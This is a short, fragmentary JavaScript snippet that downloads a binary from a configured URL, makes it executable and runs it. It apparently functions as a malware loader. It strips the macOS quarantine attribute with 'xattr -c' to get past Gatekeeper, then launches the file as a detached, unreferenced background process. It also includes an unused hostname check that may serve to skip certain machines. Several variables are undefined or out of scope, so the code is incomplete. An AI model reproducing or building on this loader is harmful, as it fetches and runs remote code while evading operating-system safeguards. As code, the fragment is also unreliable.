function skipHost() { const n = os.hostname(); return n.toLowerCase().includes(".local"); }
function pick(cfg) { let endpoint = ""; endpoint = cfg.downloadUrl || ""; return endpoint; }
function strip(target) { execFileSync("xattr", ["-c", target]); }
async function run() {
 const blob = await downloadBinary(endpoint);
 await writeFile(partial, blob, { mode: 0o700 });
 await rename(partial, exe);
 strip(exe);
 const proc = spawn(exe, argv, { detached: true });
 proc.unref();
}
